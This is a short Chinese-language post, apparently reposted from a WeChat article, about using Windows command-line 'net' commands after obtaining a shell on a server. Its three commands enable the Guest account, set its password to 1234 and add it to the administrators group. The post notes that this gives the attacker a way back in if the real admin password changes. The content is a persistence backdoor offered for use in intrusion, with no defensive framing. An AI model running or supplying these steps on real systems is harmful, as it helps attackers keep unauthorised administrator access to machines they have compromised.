# DOS命令行里怎样激活guest用户

> 原文：[http://mp.weixin.qq.com/s?\_\_biz=MzUyMTA0MjQ4NA==&mid=2247485542&idx=1&sn=7d523614c13ac9a54d042b81c309050d&chksm=f9e0673dce97ee2bc980b139b184ce5adcaaffd47eb00ac87c70e758f2b4a83ffdd4e9f85fa6&scene=126&sessionid=1681663462#rd](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247485542&idx=1&sn=7d523614c13ac9a54d042b81c309050d&chksm=f9e0673dce97ee2bc980b139b184ce5adcaaffd47eb00ac87c70e758f2b4a83ffdd4e9f85fa6&scene=126&sessionid=1681663462#rd)

我是在拿到一台服务器shell后，创建账号一直失败，所以将guest激活并提升到管理员租，只是在渗透过程拿服务器方式中的一个演示。

我们再把guest激活加到管理组 C:\\>net user guest /active:yes 将对方的Guest用户激活

C:\\>net user guest 1234 将Guest的密码改为1234,或者你要设定的密码

C:\\>net localgroup administrators guest /add 将Guest变为Administrator^\_^(如果管理员密码更改，guest帐号没改变的话，下次我们可以用guest再次访问这台计算机)
